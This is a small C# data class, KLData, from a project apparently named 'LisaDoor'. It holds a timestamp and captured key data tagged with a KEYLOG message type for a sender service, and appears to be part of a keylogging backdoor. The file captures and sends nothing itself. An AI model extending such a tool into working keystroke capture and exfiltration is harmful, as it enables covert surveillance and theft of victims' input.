using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using static LisaDoor.SenderService;

namespace LisaDoor
{
    internal class KLData : IData
    {
        public KLData(DateTime timeCreated, string keyData) { 
            TimeCreated = timeCreated;
            KeyData = keyData;
        }

        public DateTime TimeCreated { get; }
        public MessageType MessageType { get; } = MessageType.KEYLOG;
        public string KeyData { get; set; }
    }
}
